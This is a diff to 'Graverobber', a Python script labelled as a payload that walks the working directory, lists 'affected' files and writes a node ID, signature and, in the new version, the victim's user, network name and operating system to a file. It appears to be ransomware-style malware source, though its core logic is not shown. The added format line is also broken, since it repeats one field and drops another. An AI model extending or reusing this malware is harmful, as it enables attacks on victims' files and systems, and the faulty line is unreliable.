@@ -1,5 +1,5 @@
 # ========================================================================= #
-# Graverobber v0.0.0
+# Graverobber v1.1.0
 # * [x] Payload
 #
 # Author: rfpeixoto
@@ -11,6 +11,7 @@ import base64
 import secrets
 import hashlib
 import requests
+import platform
 from tkinter import *
 from time import sleep
 from pathlib import Path
@@ -117,7 +118,8 @@ for dirpath, dirs, files in os.walk(os.getcwd()):
 # ========================================================================= #
 with open("node_{0}.txt".format(node_id), "w") as fl:
     fl.write("Node ID: {0}\n".format(node_id))
-    fl.write("Node Signature: {0}\n\n".format(node_sig))
+    fl.write("Node Signature: {0}\n".format(node_sig))
+    fl.write("[{0}@{1}]: {1} {2}\n\n".format(user_name, network_name, op_sys, arch))
     fl.write("{0} File(s) affected:\n".format(len(tool.files_found)))
     for file in tool.files_found:
         fl.write(file + "\n")
